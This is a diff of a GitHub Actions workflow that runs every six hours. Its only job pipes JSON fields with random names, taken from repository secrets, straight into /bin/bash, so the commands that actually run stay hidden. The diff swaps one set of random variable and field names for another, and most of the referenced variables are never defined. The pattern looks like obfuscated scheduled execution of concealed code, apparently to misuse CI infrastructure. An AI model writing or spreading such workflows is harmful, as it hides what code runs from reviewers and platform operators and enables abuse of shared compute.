@@ -1,10 +1,11 @@
 name: panxiaoxia1616
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 1/6 * * *'
+    - cron: '32 2/6 * * *'
 
-jobs:  # 14637
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +13,10 @@ jobs:  # 14637
       - uses: actions/checkout@v4
       - name: panxiaoxia1616
         env:
-          dcq286: ${{ secrets.dcq286 }}
+          fc23: ${{ secrets.fc23 }}
         run: |
-          echo $dcq286 | jq -r .tkvv865 | /bin/bash
-          echo $pmfk0 | jq -r .j2 | /bin/bash
-          echo $pyiqg7 | jq -r .ytbn7761 | /bin/bash
-          echo $k56680 | jq -r .dts627 | /bin/bash
-          echo $erd5 | jq -r .fx790 | /bin/bash
-          echo $s8983 | jq -r .kduzs5511 | /bin/bash
-          echo $varc76458 | jq -r .hjhna2 | /bin/bash
-          echo $y68 | jq -r .wrd3 | /bin/bash
+          echo $fc23 | jq -r .tdvv4795 | /bin/bash
+          echo $fniu0 | jq -r .dbxm153 | /bin/bash
+          echo $hjmi82744 | jq -r .fc513 | /bin/bash
+          echo $zf92 | jq -r .jbc4099 | /bin/bash
 
